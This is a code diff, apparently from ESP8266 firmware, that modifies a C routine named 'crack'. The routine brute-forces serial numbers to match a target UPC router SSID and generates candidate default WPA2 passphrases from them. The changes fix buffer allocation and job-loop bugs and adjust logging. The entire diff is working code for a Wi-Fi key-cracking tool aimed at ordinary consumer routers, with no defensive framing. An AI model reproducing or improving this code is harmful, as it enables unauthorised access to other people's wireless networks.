@@ -489,7 +489,7 @@ void hash2pass(uint8_t *in_hash, char *out_pass)
 
 		out_pass[i] = a;
 	}
-	out_pass[8] = 0;
+    // out_pass[8] = 0;
 }
 
 
@@ -507,6 +507,7 @@ uint32_t mangle(uint32_t *pp)
 
 __attribute((optimize("O3")))
 ICACHE_FLASH_ATTR
+static
 uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
 {
     uint64_t a = data[0] * 2500000 + data[1] * 6800 + data[2] + magic;
@@ -560,25 +561,24 @@ static void crack(os_event_t *events){
         if (upc_generate_ssid(buf, MAGIC_24GHZ) != job->target)
             continue;
 
-        char serial[64];
-        char pass[9];
+        size_t required_size = 8*(job->passwords_found+3);
+        if(job->candidate_passwords){
+            job->candidate_passwords = os_realloc(job->candidate_passwords, required_size);
+            memset(job->candidate_passwords+(job->passwords_found*8), 0, 3*8);
+        } else {
+            job->candidate_passwords = os_zalloc(required_size);
+        }
 
         uint8_t *prefix[3] = {"SAAP", "SAPP", "SBAP"};
         size_t prefix_idx;
 
         for(prefix_idx = 0; prefix_idx < 3; prefix_idx++){
+            char serial[13] = {0};
+            char *pass = job->candidate_passwords+(8*(job->passwords_found));
             os_sprintf(serial, "%s%d%03d%d", prefix[prefix_idx], buf[0], buf[1], buf[2]);
             serial2pass(serial, pass);
-            printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
-
+            //printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
             job->passwords_found++;
-            size_t required_size = 8*job->passwords_found;
-            if(job->candidate_passwords){
-                job->candidate_passwords = os_realloc(job->candidate_passwords, required_size);
-            } else {
-                job->candidate_passwords = os_zalloc(required_size);
-            }
-            memcpy(job->candidate_passwords+(8*(job->passwords_found-1)), pass, 8);
         }
     }
 
@@ -589,7 +589,7 @@ static void crack(os_event_t *events){
     }
     if(buf[1] == MAX1+1){
         buf[1] = 0;
-        /*printf("Cracking %u target(s)... %u/%u\n", jobs_active, buf[0], MAX0);*/
+        printf("Cracking %u target(s)... %u/%u\n", jobs_active, buf[0], MAX0);
         buf[0]++;
     }
     if(buf[0] == MAX0+1){
@@ -598,12 +598,12 @@ static void crack(os_event_t *events){
         buf[2] = 0;
     }
     for(jobs_idx = 0; jobs_idx < last_active_job; jobs_idx++){
-        if(memcmp(job->start_buf, buf, sizeof(buf)) == 0){
+        job = crack_jobs[jobs_idx];
+        if(job && memcmp(job->start_buf, buf, sizeof(buf)) == 0){
             printf("Finished generating passwords for target UPC%07d\n", job->target);
             delete_cracker_job(job);
             finished_jobs[jobs_finished] = job;
             jobs_finished++;
-            break;
         }
     }
 
